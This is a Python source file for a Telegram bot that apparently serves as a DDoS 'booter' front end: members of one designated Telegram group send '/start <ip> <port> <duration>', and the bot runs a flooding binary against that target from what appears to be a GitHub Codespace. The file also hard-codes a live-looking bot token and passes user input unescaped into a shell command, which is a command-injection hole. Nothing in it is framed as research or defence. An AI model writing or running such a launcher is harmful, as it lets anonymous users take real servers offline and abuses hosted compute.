import os
import telebot
import logging
import time
import asyncio
from threading import Thread

loop = asyncio.get_event_loop()

TOKEN = '6258485737:AAEve0vut5sJTw4cin8NexE_L-dRcb2ph8A'
FORWARD_CHANNEL_ID = -1002172184452
CHANNEL_ID = -1002172184452
error_channel_id = -1002172184452

DESIGNATED_GROUP_ID = -1002271966296  # Define the designated group ID

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

running_processes = []
attack_in_progress = False  # Flag to indicate if an attack is ongoing

async def run_attack_command_on_codespace(target_ip, target_port, duration):
    global attack_in_progress
    command = f"./program {target_ip} {target_port} {duration} 70"
    try:
        attack_in_progress = True  # Set the flag when an attack starts
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")

    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)
        attack_in_progress = False  # Reset the flag when the attack ends

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    await run_attack_command_on_codespace(target_ip, target_port, duration)

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

def is_in_designated_group(chat_id):
    return chat_id == DESIGNATED_GROUP_ID

@bot.message_handler(func=lambda message: is_in_designated_group(message.chat.id))
def handle_commands(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if message.text.startswith('/start'):
        start_command(message)
    elif message.text.startswith('/approve') or message.text.startswith('/disapprove'):
        if not is_user_admin(user_id, CHANNEL_ID):
            bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
            return
        bot.send_message(chat_id, "*Approval system is disabled.*", parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_in_designated_group(chat_id):
        bot.send_message(chat_id, "*This bot can only be used in the designated group.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        bot.send_message(chat_id, "*An attack is already in progress. Please wait until it ends.*", parse_mode='Markdown')
        return

    try:
        args = message.text.split()[1:]  # Get the args from the command
        if len(args) != 3:
            bot.send_message(chat_id, "*Invalid command format. Please use: /start <target_ip> <target_port> <duration>*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(chat_id, f"*Attack started ⚡\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing start command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
		